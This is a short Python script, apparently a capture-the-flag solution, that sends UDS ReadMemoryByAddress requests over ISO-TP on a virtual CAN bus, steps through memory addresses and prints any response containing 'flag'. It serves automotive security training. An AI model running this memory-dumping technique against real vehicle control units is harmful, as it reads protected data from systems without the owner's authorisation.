import subprocess
import time

Sender_target_canid = "7E0"
Receiver_target_canid = "7E8"
interface = "vcan0"

def send_packet(input_bytes_int: list[int]):
    input_bytes_str = [(hex(by)[2:]).zfill(2) for by in input_bytes_int]
    input_data = " ".join(input_bytes_str)
    
    # subprocess.callで標準入力を渡す
    subprocess.run(['isotpsend', '-s', Sender_target_canid, '-d', Receiver_target_canid, interface], input=input_data.encode())

def create_background_recv_process():
    return subprocess.Popen(
        ['isotprecv', '-s', Sender_target_canid, '-d', Receiver_target_canid, interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
def hex_to_ascii(hex_string):
    # 16進数文字列をスペースで分割してリストにする
    hex_values = hex_string.split()
    
    # 16進数リストをアスキー文字列に変換
    ascii_string = ''.join([chr(int(h, 16)) for h in hex_values])
    
    return ascii_string.encode("utf-8")

if __name__ == "__main__":
    
    process = create_background_recv_process()
    time.sleep(0.5)


    for i in range(0x00, 0x12):
        if (i%0x10)==0:
            print(f"The {i} trial starts")
        
        # ISO TP
        packet = [0x23, 0x14, 0xC3, 0xF8, i, 0x00, 0xFF]

        send_packet(packet)

        if process.poll() is not None:
            stdout, stderr = process.communicate()
            
            msg = stdout.decode("utf-8")
            if stderr:
                raise Exception(f"error has occured in {i}")
            
            response_msg = msg.split("\n")[0].strip()
            process = create_background_recv_process()
            time.sleep(0.1)
            
            target_msg = hex_to_ascii(response_msg[3:]).decode("utf-8")
            if "flag" in target_msg:
                print(target_msg)
            
            


            
        






    


    


